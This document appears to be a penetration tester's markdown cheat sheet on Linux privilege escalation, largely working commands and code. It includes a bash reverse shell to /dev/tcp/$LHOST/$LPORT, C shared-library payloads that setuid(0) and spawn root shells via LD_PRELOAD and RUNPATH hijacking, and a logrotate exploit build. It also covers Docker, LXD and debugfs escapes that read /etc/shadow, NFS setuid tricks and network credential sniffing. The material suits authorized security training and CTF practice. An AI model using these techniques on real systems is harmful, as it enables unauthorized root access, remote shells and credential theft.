# Linux Privilege Escalation

Below are the methods to escalate privileges in linux systems:

## Environment Enumeration

```shell
# Current user
whoami
# Current user id
id
# Server name
hostname
# Kernal info
cat /etc/os-release
uname -a
# PATH variable
echo $PATH
# env variables
env
# CPU info
lscpu
# Available shells
cat /etc/shells

# Mounted drives and unmounted drives
cat /etc/fstab
df -h
at /etc/fstab | grep -v "#" | column -t # unmounted
# block devices on the system (hard disks, USB drives, optical drives, etc.)
lsblk
# Printers info
lpstat
# Network info
ifconfig
route
netstat -rn
arp -a
ip a
cat /etc/hosts
```

```shell
# Commands user can run with sudo
sudo -l
# Existing users on device
cat /etc/passwd | cut -f1 -d:
# Users with login shells
grep "*sh$" /etc/passwd
# Existing groups
cat /etc/group
# Group members
getent group <group name>
```

```shell
# Home directories
ls /home

# Hidden files and directories
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep $USER
find / -type d -name ".*" -ls 2>/dev/null
# Configuration files
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
# Scripts
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"

# History
history
# History files
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
```

```shell
# User's last login
lastlog
# Logged in users
w
# Services running by a user
ps aux | grep $USER
```

```shell
# Cronjobs
ls -la /etc/cron.daily/

# Proc filesystem
# The proc filesystem (proc / procfs) is a particular filesystem in
# Linux that contains information about system processes, hardware,
# and other system information. It is the primary way to access process
# information and can be used to view and modify kernel settings. It is
# virtual and does not exist as a real filesystem but is dynamically 
# generated by the kernel. 
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"

# Installed packages and binaries
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
ls -l /bin /usr/bin/ /usr/sbin/

# Sudo version
sudo -V
```

- `GTFObins` is a platform that includes a list of binaries that can potentially be
exploited to escalate our privileges on the target system.

```shell
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done
```

- We can use `strace` to track and analyze system calls and signal processing.

```shell
strace <command>
strace ping -c1 10.129.112.20
```

## Credential Hunting

```shell
cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
ls ~/.ssh
ls /home/*/.ssh
```

> Also check password cracking section

## Wildcard and PATH Abuse

- Wildcard and path abuse techniques exploit misconfigurations in file handling, especially
 in automated scripts.  
- Wildcard Abuse: Leverages `*` or `?` in shell commands (e.g., `rm *`) to inject malicious files
 like `--exec` or `-rf` for command execution.  
- Path Abuse: Manipulates the `PATH` environment variable to execute malicious binaries instead of
 legitimate system commands.  
- Both techniques can escalate privileges or achieve code execution if proper sanitization is missing.

## Escaping Restricted Shells

- A restricted shell is a type of shell that limits the user's ability to execute commands.
- Examples: `rbash`, `rksh`, `rzsh`
- Following are methods to escape these shells:

```shell
# Command injection
ls -l `pwd`
# Command substitution
echo `id`
echo $(whoami)
# Command Chaining
echo Hi;id
echo Hi | id
```
- If shell uses `env` variable to specify the directory in which commands are executed,
it may be possible to escape from the shell by modifying the value of the environment 
variable to specify a different directory.
- Define and call shell functions that execute commands not restricted by the shell.

## Special Permissions

- The `Set User ID upon Execution (setuid)` permission can allow a user to execute a program
or script with the permissions of another user, typically with elevated privileges.
- The setuid bit appears as an `s`.
- The `Set-Group-ID (setgid)` permission is another special permission that allows us to run
binaries as if we were part of the group that created them.

```shell
# List files with setuid bit
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
# List files with setgid bit
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```

- Find payloads here: [GTFObins](https://gtfobins.github.io/)


## Sudo Rights Abuse

- Sudo privileges can be granted to an account, permitting the account to run certain commands
in the context of the root (or another account) without having to change users or grant excessive
privileges.
- Any rights entries with the `NOPASSWD` option can be seen without entering a password.

```shell
sudo -l
```

- Find payloads here: [GTFObins](https://gtfobins.github.io/)


## Privileged Groups

### LXD

- `LXD` is Ubuntu's container manager. Upon installation, all users are added to the LXD group.
- Membership of this group can be used to escalate privileges by creating an LXD container, 
making it privileged, and then accessing the host file system at `/mnt/root`.

```shell
# Get alpine image an unzip it
unzip alpine.zip 
# Start the LXD initialization process
lxd init
# Import the local image
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
# Start a privileged container with the security.privileged set to true
lxc init alpine r00t -c security.privileged=true
# Mount the host file system
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
# Start the container
lxc start r00t
# Spawn shell inside container
lxc exec r00t /bin/sh
```

### Docker

- Placing a user in the docker group is essentially equivalent to root level access to
the file system without requiring a password.
- Members of the docker group can spawn new docker containers.

```shell
docker run -v /root:/mnt -it $IMAGE_NAME

docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
docker -H unix:///app/docker.sock ps
docker -H unix:///app/docker.sock exec -it $CONTAINER_ID /bin/bash

docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it $IMAGE_NAME chroot /mnt bash
```

- Once the container is started we are able to browse the mounted directory and retrieve
or add SSH keys for the root user or read `/etc/shadow` file.

### Disk

- Users within the disk group have full access to any devices contained within `/dev`, such as
`/dev/sda1`, which is typically the main device used by the operating system.
- An attacker with these privileges can use `debugfs` to access the entire file system with root
level privileges.

```shell
# Verify disk access
ls -l /dev/sda1
# Launch debugfs
sudo debugfs /dev/sda1
# Read sensitive files
debugfs: cat /etc/shadow
```

### ADM

- Members of the adm group are able to read all logs stored in `/var/log`.
- This does not directly grant root access, but could be leveraged to gather sensitive data 
stored in log files or enumerate user actions and running cron jobs.


## Capabilities

- Linux capabilities are a security feature in the Linux operating system that allows specific
privileges to be granted to processes, allowing them to perform specific actions that would otherwise 
be restricted.
- This allows for more fine-grained control over which processes have access to certain privileges, 
making it more secure than the traditional Unix model of granting privileges to users and groups.

```shell
# Enumerating capabilities
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

## Cronjobs

```shell
# Enumerating cronjobs
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

# Using pspy, a command-line tool used to view running processes
./pspy -pf -i 1000
```

## Logrotate

- To exploit logrotate, we need some requirements that we have to fulfill.
    - We need write permissions on the log files
    - Logrotate must run as a privileged user or root
    - Vulnerable versions: 3.8.6, 3.11.0, 3.15.0, 3.18.0

```shell
# Determine which option logrotate uses in logrotate.conf
# Use the exploit adapted to this function.
grep "create\|compress" /etc/logrotate.conf | grep -v "#"

# Prepare the cve exploit
git clone https://github.com/whotwagner/logrotten.git
cd logrotten
gcc logrotten.c -o logrotten

# Reverse shell payload
echo 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1' > payload
```

## Passive Traffic Capture

- Using PCredz to capture credentials over the wire

```shell
# Installation
apt install python3-pip && sudo apt install libpcap-dev && sudo apt install file && pip3 install Cython && pip3 install python-libpcap

# extract credentials from a pcap file
python3 ./Pcredz -f file-to-parse.pcap
# extract credentials from all pcap files in a folder
python3 ./Pcredz -d /tmp/pcap-directory-to-parse/
# extract credentials from a live packet capture on a network interface (need root privileges)
python3 ./Pcredz -i $INTERFACE -v
```

- Using net-creds

```shell
# Choose the interface and start capturing
sudo python net-creds.py -i eth0

# Read from pcap
python net-creds.py -p pcapfile
```

## Weak NFS Permissions

- We can create a `SETUID` binary that executes `/bin/sh` using our local root user.
- We can then mount the /tmp directory locally, copy the `root-owned` binary over to the NFS server, and set the `SUID` bit.

> Vulnerable to this attack `*(rw,no_root_squash)`

```
# Check mount
showmount -e $TARGET_IP
# Mount share
sudo mount -t nfs $TARGET_IP:/$SHARE_NAME$ /mnt
# Copy shell to the mounted share
cp shell /mnt
# Set setuid bit
chmod u+s /mnt/shell
```

## Hijacking Tmux Sessions

- A user may leave a tmux process running as a privileged user, such as root set up with weak permissions, and can be hijacked.
- This may be done with the following commands to create a new shared session and modify the ownership.

```shell
tmux -S /$SOCKET_NAME new -s hijacked_session
tmux -S /shareds new -s debugsess
chown root:devs /shareds

# Attach to the tmux session and confirm root privileges.
tmux -S /shareds
```

> Below attacks when you have a setuid binary or sudo right to run a binary.

## Shared Libraries

- We can utilize the LD_PRELOAD environment variable to escalate privileges. For this, we need a user with sudo privileges.
- If we can restart a service or run a binary with root privileges we can exploit it.

```cpp
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

- Compile it and get root.

```shell
# Compiling the payload
gcc -fPIC -shared -o payload.so payload.c -nostartfiles

# Exploiting payload
# eg: sudo LD_PRELOAD=payload.so /usr/sbin/apache2 restart
sudo LD_PRELOAD=payload.so $COMMAND
```

## Shared Object Hijacking

```shell
# Print the shared object required by a binary or shared object
ldd $BINARY
```

- Check for any non-standard library.
- It is possible to load shared libraries from custom locations. 
- One such setting is the `RUNPATH` configuration. Libraries in this folder are given preference over other folders. 

```shell
readelf -d $BINARY | grep PATH
# Sample output: 
# 0x000000000000001d (RUNPATH)   Library runpath: [/abc]
```

- The configuration allows the loading of libraries from the /abc folder.
If it is writable by us, this misconfiguration can be exploited by placing a malicious library in /abc, which will take precedence over other folders because entries in this file are checked first.

- Run the binary, generate an error and check which function it is calling from the custom library.

```cpp
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void $CALLED_FUNCTION() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 
```

- Compile the library

```shell
gcc exploit.c -fPIC -shared -o /abc/$CUSTOM_LIBRARY.so
```

## Python Library Hijcking

### Wrong Write Permissions
- If we have a script with setuid and have `read` privileges on it.
- We can check if we have `write` permissions on any module used in it.

```shell
grep -r "def $FUNCTION_USED" /usr/local/lib/python3.8/dist-packages/$MODULE/*
ls -al $PATH_TO_MODULE_FILE
```

- If we can write, add reverse shell code into it.

### Library Path

- In Python, each version has a specified order in which libraries (modules) are searched and imported from. 
- The order in which Python imports modules from are based on a priority system.

```shell
# Check paths precedence
python3 -c 'import sys; print("\n".join(sys.path))'
# Using pip
pip3 show $LIBRARY_NAME #eg psutil
```

- To be able to exploit this, two prerequisites are necessary.
    -The module that is imported by the script is located under one of the lower priority paths listed via the `PYTHONPATH` variable.
    - We must have write permissions to one of the paths having a higher priority on the list.

- Create a file with the same name as the library file with reverse shell code.


### PYTHONPATH Environment Variable

- `PYTHONPATH` is an environment variable that indicates what directory (or directories) Python can search for modules to import.
- This is important as if a user is allowed to manipulate and set this variable while running the python binary, they can effectively redirect Python's search functionality to a user-defined location when it comes time to import modules.
- We can see if we have the permissions to set environment variables for the python binary by checking our sudo permissions:

```shell
sudo -l
# eg:(ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

- Create a file with the same name as the library file with reverse shell code in /tmp.

```shell
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./file.py
```

## Other things to check

- Kernal Exploits
- Sudo version exploit (eg: sudo -u#-1 id)
- Dirty Pipe
- Dirt Cow
- Polkit (pkexec, pkaction, pkcheck)
- Netfilter